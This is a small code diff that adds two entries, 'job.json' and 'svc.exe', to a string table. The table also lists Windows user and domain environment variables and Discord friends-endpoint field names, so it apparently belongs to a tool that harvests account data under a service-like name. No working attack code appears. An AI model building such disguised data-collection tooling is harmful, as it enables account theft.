@@ -639,6 +639,8 @@ STRINGS = [
     ("env_userdomain", "USERDOMAIN"),
     ("env_username", "USERNAME"),
     ("main_unknown", "unknown"),
+    ("spawn_meta_name", "job.json"),
+    ("spawn_sender_name", "svc.exe"),
 
     # === discord/mod.rs - JSON field names (friends endpoint) ===
     ("discord_field_type", "type"),
